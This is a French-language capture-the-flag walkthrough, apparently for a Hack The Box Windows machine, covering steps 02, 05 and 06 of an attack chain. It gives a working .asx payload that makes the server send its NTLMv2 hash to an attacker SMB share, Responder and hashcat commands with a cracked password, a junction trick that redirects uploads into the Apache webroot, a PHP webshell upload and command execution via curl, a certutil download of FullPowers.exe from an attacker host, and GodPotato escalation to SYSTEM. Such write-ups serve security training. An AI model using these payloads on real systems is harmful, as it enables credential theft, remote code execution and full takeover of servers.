02
Capture NTLMv2 via Responder Forcer le serveur à nous envoyer son hash d'authentification

📄 Le vecteur : fichier .asx

ProMotion Studio expose un formulaire de recrutement qui permet d'uploader une vidéo. Un fichier .asx est une playlist Windows Media Player contenant une référence vers une ressource réseau distante.

Quand le serveur ouvre ce fichier, Windows tente automatiquement de se connecter via SMB et envoie le hash NTLMv2 du compte qui exécute le processus.

XML — payload.asx 
<ASX version="3.0">
  <Entry>
    <Ref href="\\10.10.14.252\share\video.wmv"/>
  </Entry>
</ASX>

📡 Responder — Interception du hash

Responder écoute sur les protocoles réseau (SMB, HTTP, LLMNR) et capture les authentifications entrantes en créant de faux serveurs.

Bash 
sudo responder -I tun0
# -I tun0 : écoute sur l'interface VPN HTB

# Hash capturé :
[SMB] NTLMv2 — MEDIA\enox
enox::MEDIA:7811c1e19d484f0c:BCB14EF02124623F...

🔓 Hashcat — Cracking du hash

Hashcat casse les mots de passe par dictionnaire en utilisant le GPU pour tester des millions de combinaisons par seconde.

Bash 
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt
# -m 5600 : mode NTLMv2
# rockyou.txt : 14 millions de mots de passe

enox : 1234virus@
Mot de passe faible. Présent dans rockyou.txt — un mot de passe long et aléatoire aurait résisté au cracking.

05
Junction Attack + Webshell (RCE) Rediriger l'upload vers le webroot Apache

🔗 Qu'est-ce qu'une Junction Windows ?

Une junction est l'équivalent Windows d'un lien symbolique pour les dossiers. Tout ce qui est écrit dans le dossier source est redirigé transparentement vers le dossier cible.

C:\Windows\Tasks\Uploads\<md5>\ ──junction──► C:\xampp\htdocs\ ↑ ↑ Où PHP écrit les fichiers Où Apache sert les fichiers

⚡ Exploitation en 4 étapes

Étape 1 — Calculer le MD5 :

Bash — Kali 
echo -n "johndoejohn@doe.com" | md5sum
12c11b14d917e8d8fb03881e5929ff74

Étape 2 — Créer la junction :

CMD — SSH enox 
mklink /J "C:\Windows\Tasks\Uploads\12c11b14d917e8d8fb03881e5929ff74" C:\xampp\htdocs
Junction created <<===>> C:\xampp\htdocs

Étape 3 — Upload du webshell :

Bash — Kali 
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -X POST http://10.129.14.167/ \
  -F "firstname=john" \
  -F "lastname=doe" \
  -F "email=john@doe.com" \
  -F 'fileToUpload=@/tmp/shell.php;type=application/php'

Étape 4 — Exécution de commandes :

Bash 
curl "http://10.129.14.167/shell.php?cmd=whoami"
nt authority\local service
Pourquoi LOCAL SERVICE ? Apache (XAMPP) tourne sous NT AUTHORITY\LOCAL SERVICE par défaut sur Windows. Tout code PHP exécuté hérite de ce compte.
06
Privilege Escalation LOCAL SERVICE → SYSTEM via FullPowers + GodPotato

🔑 Disabled ≠ Absent — différence critique

ÉtatSignificationExploitable ?
Enabled Actif immédiatement Oui
Disabled Présent mais endormi, réactivable par code Oui (avec le bon outil)
Absent N'existe pas dans le token Non
SeTcbPrivilege est Disabled mais présent. Il peut être réactivé via l'API Windows AdjustTokenPrivileges().

⚙️ Étape A — FullPowers : Restaurer les privilèges

SeTcbPrivilege (Act as part of the operating system) permet de créer des tokens Windows avec des privilèges arbitraires. FullPowers le réactive puis crée un nouveau token avec tous les privilèges de LOCAL SERVICE restaurés.

Bash 
# Transfert de FullPowers vers la cible
certutil -urlcache -f http://10.10.14.252:8080/FullPowers.exe C:\Windows\Temp\FullPowers.exe

# Exécution
C:\Windows\Temp\FullPowers.exe -c "C:\Windows\Temp\rev2.exe" -z
Privilèges restaurés :
SeImpersonatePrivilege — Enabled ✓
SeAssignPrimaryTokenPrivilege — Enabled ✓

🥔 Étape B — GodPotato : SeImpersonatePrivilege → SYSTEM

SeImpersonatePrivilege permet d'emprunter l'identité d'un autre utilisateur. GodPotato crée un faux serveur COM/RPC, force SYSTEM à s'y connecter, puis vole le token SYSTEM via ImpersonateNamedPipeClient().

[LOCAL SERVICE] │ │ 1. Crée un faux serveur COM/RPC ▼ [Windows RPCSS / DCOM] │ │ 2. Force SYSTEM à se connecter ▼ [GodPotato intercepte] │ │ 3. ImpersonateNamedPipeClient() → vole le token ▼ [NT AUTHORITY\SYSTEM] 🎉
